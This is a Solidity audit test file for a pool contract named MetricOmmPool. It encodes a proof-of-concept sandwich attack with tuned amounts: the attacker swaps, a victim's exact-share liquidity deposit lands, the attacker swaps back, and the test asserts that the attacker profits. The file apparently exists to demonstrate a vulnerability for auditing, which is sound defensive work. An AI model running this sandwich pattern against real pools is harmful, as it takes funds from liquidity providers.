// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {MetricOmmPoolBaseTest} from "./MetricOmmPool.base.t.sol";

contract LiquidityAddSandwichAuditTest is MetricOmmPoolBaseTest {
  uint80 internal constant SEED_SALT = 1;
  uint80 internal constant VICTIM_SALT = 2;

  function test_exactShareDepositCanSubsidizeUncappedRoundTrip() public {
    bool zeroForOne = false;
    // Deep, symmetric pre-existing liquidity lets the first leg move the cursor
    // without relying on a pre-existing external price discrepancy.
    _addLiquidity(2, -5, 4, 1e20, SEED_SALT);

    uint128 attackAmount = 49_999_999_000_000_003_435;
    uint104 victimShares = 4_721_563_304_954_665_842_223;

    uint256 attackerValueBefore =
      token0.balanceOf(address(callers[0])) + token1.balanceOf(address(callers[0]));

    (int256 firstDelta0, int256 firstDelta1) =
      _swap(0, address(callers[0]), zeroForOne, _i128ExactIn(attackAmount), zeroForOne ? 0 : type(uint128).max);

    // This is the victim's pending exact-share range deposit after the cursor has moved.
    _addLiquidity(1, -5, 4, victimShares, VICTIM_SALT);

    uint128 reverseInput = zeroForOne ? _u128FromNegDelta(firstDelta1) : _u128FromNegDelta(firstDelta0);
    if (reverseInput != 0) {
      _swap(
        0,
        address(callers[0]),
        !zeroForOne,
        _i128ExactIn(reverseInput),
        zeroForOne ? type(uint128).max : 0
      );
    }

    uint256 attackerValueAfter =
      token0.balanceOf(address(callers[0])) + token1.balanceOf(address(callers[0]));

    if (attackerValueAfter > attackerValueBefore) {
      emit log_named_uint("attack input", attackAmount);
      emit log_named_uint("victim shares", victimShares);
      emit log_named_int("first delta0", firstDelta0);
      emit log_named_int("first delta1", firstDelta1);
      emit log_named_uint("reverse input", reverseInput);
      emit log_named_uint("attacker profit at 1:1", attackerValueAfter - attackerValueBefore);
    }

    assertGt(attackerValueAfter, attackerValueBefore, "expected uncapped deposit sandwich profit");
  }
}
